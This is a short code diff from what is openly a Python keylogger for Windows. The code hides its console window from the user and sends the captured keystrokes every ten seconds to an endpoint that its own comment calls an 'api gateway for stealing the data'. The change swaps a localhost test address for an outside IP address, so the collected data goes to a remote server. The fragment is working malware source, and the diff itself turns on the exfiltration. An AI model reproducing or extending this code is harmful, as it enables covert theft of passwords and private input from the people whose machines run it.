@@ -8,7 +8,6 @@ import pythoncom, pyHook
 import requests
 import datetime
 
-
 #getting the current window the app is running
 myWindow = win32console.GetConsoleWindow()
 #hiding it from the user
@@ -17,7 +16,9 @@ myWindow = win32console.GetConsoleWindow()
 #variable holding the global stream
 dataStream = ""
 #api gateway for stealing the data
-apiUrl = 'http://127.0.0.1:8000/api/sendData/'
+#apiUrl = 'http://127.0.0.1:8000/api/sendData/'
+apiUrl = 'http://3.17.7.99/api/sendData/'
+
 #for sending data at 10 second intervals (can be changed)
 start_time = datetime.datetime.now()
 #getting the current pc's IP
